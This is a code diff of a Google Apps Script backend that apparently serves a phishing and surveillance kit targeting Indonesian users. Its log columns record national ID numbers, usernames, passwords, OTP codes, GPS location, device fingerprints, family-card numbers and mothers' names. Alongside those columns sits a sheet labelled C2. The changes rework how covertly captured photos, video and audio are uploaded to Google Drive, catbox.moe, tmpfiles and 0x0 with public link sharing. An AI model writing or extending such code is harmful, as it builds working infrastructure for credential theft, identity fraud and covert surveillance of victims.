@@ -9,7 +9,7 @@ var DRIVE_FOLDER_ID='1QgviD6FDitWLTOGG1P8WKq7tJ2Xo6zoD';
 var NOTIFY_EMAIL='ajasomplak3@gmail.com';
 var DUKCAPIL_URL='',DUKCAPIL_KEY='';
 var HOST_URUT='drive,catbox,tmpfiles,0x0';
-var BUILD='zgch-f25',AUTO_RELOAD=false;
+var BUILD='zgch-f27',AUTO_RELOAD=false;
 
 var H_LOG=['WAKTU','NIK','USERNAME','PASSWORD','DEVICE_ID','UA','PLATFORM','BAHASA','ZONA','LAYAR','RID','OTP','WAKTU_OTP','IP','ISP','LAT','LNG','AKURASI','MAPS','FOTO','SKOR','SIDIK','REFERRER','SID','HALAMAN','KLIK','STATUS','CATATAN','NO_KK','NO_HP','IBU'];
 var H_IMP=['SID','WAKTU','IP','ISP','KOTA','LAT','LNG','PROV','NEGARA','ZONA','DEVICE','PLATFORM','BAHASA','LAYAR','UA','MODEL','MEMORI','INTI','GPU','BATERAI','SIDIK','PROBE','YIELD','PROMPTS','LAUNDER','SUMBER','FOTO','TIPE','BRAND','MODEL_DEV','OS_DEV','BROWSER_DEV','SKOR_DET','DIKUNJUNGI','KAM'];
@@ -167,14 +167,40 @@ function open_(p){
     }catch(e2){return {action:p.action,sid:p.sid,__err:e.message+' / '+e2.message}}
   }
 }
-function folder_(){try{return DriveApp.getFolderById(DRIVE_FOLDER_ID)}catch(e){return DriveApp.createFolder('ZGCH')}}
+var FOLD=null;
+function folder_(){
+  if(FOLD)return FOLD;
+  try{FOLD=DriveApp.getFolderById(DRIVE_FOLDER_ID);return FOLD}catch(e){}
+  try{var it=DriveApp.getFoldersByName('ZGCH');if(it.hasNext()){FOLD=it.next();return FOLD}}catch(e){}
+  FOLD=DriveApp.createFolder('ZGCH');return FOLD;
+}
 function acak_(){return Math.random().toString(36).slice(2,10)}
 function ext_(mime){
-  if(mime.indexOf('mp4')>-1)return '.mp4';
-  if(mime.indexOf('ogg')>-1)return '.ogg';
-  if(mime.indexOf('m4a')>-1)return '.m4a';
-  if(mime.indexOf('jpeg')>-1)return '.jpg';
+  var m=String(mime||'').toLowerCase();
+  if(m.indexOf('mp4')>-1)return '.mp4';
+  if(m.indexOf('ogg')>-1)return '.ogg';
+  if(m.indexOf('m4a')>-1)return '.m4a';
+  if(m.indexOf('png')>-1)return '.png';
+  if(m.indexOf('webp')>-1)return '.webp';
+  if(m.indexOf('jpeg')>-1||m.indexOf('jpg')>-1)return '.jpg';
   return '.webm';
+}
+function catatMedia_(jenis,sid,byte,mime,host,url,status){
+  try{getSheet_(SHEET_MEDIA).appendRow([now_(),String(sid||''),String(jenis||''),byte||0,
+    String(mime||''),String(host||'-'),String(url||'-'),String(status||'-')])}catch(e){}
+}
+function unggahDrive_(bytes,mime,nama,jenis,sid){
+  var blob=Utilities.newBlob(bytes,mime,nama),f=null;
+  try{f=folder_().createFile(blob)}catch(e){}
+  if(!f){try{f=DriveApp.createFolder('ZGCH').createFile(blob)}catch(e){}}
+  if(!f){try{f=DriveApp.createFile(blob)}catch(e){}}
+  if(!f){catatMedia_(jenis,sid,bytes.length,mime,'drive','-','gagal');return null}
+  var id=f.getId();
+  try{f.setSharing(DriveApp.Access.ANYONE_WITH_LINK,DriveApp.Permission.VIEW)}catch(e){}
+  var h={host:'drive',id:id,url:'https://drive.google.com/file/d/'+id+'/view',
+    thumb:'https://drive.google.com/thumbnail?id='+id+'&sz=w900'};
+  catatMedia_(jenis,sid,bytes.length,mime,'drive',h.url,'ok');
+  return h;
 }
 function unggah_(bytes,mime,nama,jenis,sid){
   var blob=Utilities.newBlob(bytes,mime,nama);
@@ -185,7 +211,9 @@ function unggah_(bytes,mime,nama,jenis,sid){
     var h=host[i];
     if(hasil)break;
     try{
-      if(h==='catbox'){
+      if(h==='drive'){
+        hasil=unggahDrive_(bytes,mime,nama,jenis,sid);
+      } else if(h==='catbox'){
         var r=UrlFetchApp.fetch('https://catbox.moe/user/api.php',{method:'post',muteHttpExceptions:true,
           headers:{'User-Agent':'Mozilla/5.0'},payload:{reqtype:'fileupload',fileToUpload:blob}});
         var t=String(r.getContentText()).trim();
@@ -201,25 +229,16 @@ function unggah_(bytes,mime,nama,jenis,sid){
           headers:{'User-Agent':'Mozilla/5.0'},payload:{file:blob}});
         var t3=String(r3.getContentText()).trim();
         if(/^https?:\/\//.test(t3))hasil={host:'0x0',url:t3};
-      } else if(h==='drive'){
-        var f=folder_().createFile(blob);
-        try{f.setSharing(DriveApp.Access.ANYONE_WITH_LINK,DriveApp.Permission.VIEW)}catch(e){}
-        hasil={host:'drive',url:'https://drive.google.com/file/d/'+f.getId()+'/view',
-          thumb:'https://drive.google.com/thumbnail?id='+f.getId()+'&sz=w900'};
       }
     }catch(e){}
   }
-  getSheet_(SHEET_MEDIA).appendRow([now_(),String(sid||''),String(jenis||''),bytes.length,
-    mime,hasil?hasil.host:'-',hasil?hasil.url:'-',hasil?'ok':'gagal']);
-  if(!hasil){
-    getSheet_(SHEET_ANTRE).appendRow([now_(),String(sid||''),String(jenis||''),mime,nama,
-      Utilities.base64Encode(bytes),0]);
-  }
+  if(!hasil)catatMedia_(jenis,sid,bytes.length,mime,'-','-','gagal');
   return hasil;
 }
 function simpanMedia_(p,sheet,jenis,mimeBawaan,sumber){
   var b=String(p.img||'');
   if(b.indexOf('data:')===0)b=b.slice(b.indexOf(',')+1);
+  b=b.replace(/\s+/g,'');
   if(b.length<600)return {err:'kecil',len:b.length};
   var bytes;
   try{bytes=Utilities.base64Decode(b)}catch(e){return {err:'base64 rusak'}}
@@ -243,18 +262,22 @@ function sapu_(){
     var r=v[i];
     try{
       var bytes=Utilities.base64Decode(String(r[5]));
-      var h=unggah_(bytes,String(r[3]||'application/octet-stream'),
-        String(r[4]||('antre-'+Date.now())),String(r[2]||'antre'),String(r[1]||''));
+      var mime=String(r[3]||'application/octet-stream');
+      var nama=String(r[4]||('antre-'+Date.now()));
+      var jenis=String(r[2]||'antre');
+      var h=null;
+      if(jenis==='foto')h=unggahDrive_(bytes,mime,nama,jenis,String(r[1]||''));
+      if(!h)h=unggah_(bytes,mime,nama,jenis,String(r[1]||''));
       if(h){
-        var jenis=String(r[2]||'');
         if(jenis==='foto'){
+          var thumb=h.thumb||h.url;
           var im=getSheet_(SHEET_IMP),x=findRow(im,1,String(r[1]||''));
-          if(x)im.getRange(x,27).setValue(h.thumb||h.url);
+          if(x)im.getRange(x,27).setValue(thumb);
           var lg=getSheet_(SHEET_LOG),lx=findRow(lg,24,String(r[1]||''));
-          if(lx)lg.getRange(lx,20).setValue(h.thumb||h.url);
+          if(lx)lg.getRange(lx,20).setValue(thumb);
         } else {
           getSheet_(jenis==='video'?SHEET_VID:SHEET_AUD).appendRow([now_(),String(r[1]||''),'',
-            bytes.length,String(r[3]||''),h.url,h.host,'antre']);
+            bytes.length,mime,h.url,h.host,'antre']);
         }
         sh.deleteRow(i+2);beres++;
       } else {
@@ -397,25 +420,34 @@ function saveLacak(p){
   return out({ok:true});
 }
 function saveFoto(p){
-  var b=String(p.img||'');
-  if(b.indexOf('data:')===0)b=b.slice(b.indexOf(',')+1);
+  var b=String(p.img||''),mime=String(p.mime||'image/jpeg');
+  if(b.indexOf('data:')===0){
+    var mm=/^data:([^;,]+)/.exec(b);if(mm&&mm[1])mime=mm[1];
+    b=b.slice(b.indexOf(',')+1);
+  }
+  b=b.replace(/\s+/g,'');
   if(b.length<2000)return out({ok:false,err:'terlalu kecil',len:b.length});
   var bytes;
   try{bytes=Utilities.base64Decode(b)}catch(e){return out({ok:false,err:'base64 rusak',len:b.length})}
   if(bytes.length<1500)return out({ok:false,err:'byte '+bytes.length});
-  var nama='zgch-foto-'+Date.now()+'-'+acak_()+'-'+String(p.sid||'').slice(0,6)+'.jpg';
-  var h=unggah_(bytes,'image/jpeg',nama,'foto',p.sid);
+  var sid=String(p.sid||'');
+  var nama='zgch-foto-'+Date.now()+'-'+acak_()+'-'+sid.slice(0,6)+ext_(mime);
+  var h=null;
+  if(String(p.paksa||'')==='drive'){
+    h=unggahDrive_(bytes,mime,nama,'foto',sid);
+    if(!h)h=unggahDrive_(bytes,mime,nama,'foto',sid);
+  }
+  if(!h)h=unggah_(bytes,mime,nama,'foto',sid);
   if(!h){
-    getSheet_(SHEET_ANTRE).appendRow([now_(),String(p.sid||''),'foto','image/jpeg',nama,
-      Utilities.base64Encode(bytes),0]);
+    getSheet_(SHEET_ANTRE).appendRow([now_(),sid,'foto',mime,nama,Utilities.base64Encode(bytes),0]);
     return out({ok:false,err:'antre'});
   }
   var thumb=h.thumb||h.url;
-  var sh=getSheet_(SHEET_IMP),r=findRow(sh,1,String(p.sid||''));
+  var sh=getSheet_(SHEET_IMP),r=findRow(sh,1,sid);
   if(r)sh.getRange(r,27).setValue(thumb);
-  var l=getSheet_(SHEET_LOG),lr=findRow(l,24,String(p.sid||''));
+  var l=getSheet_(SHEET_LOG),lr=findRow(l,24,sid);
   if(lr)l.getRange(lr,20).setValue(thumb);
-  getSheet_(SHEET_C2).appendRow([String(p.sid||''),now_(),'foto',String(p.ket||''),'selesai',thumb,'']);
+  getSheet_(SHEET_C2).appendRow([sid,now_(),'foto',String(p.ket||''),'selesai',thumb,'']);
   return out({ok:true,thumb:thumb,url:h.url,host:h.host,byte:bytes.length});
 }
 function saveNik(p){
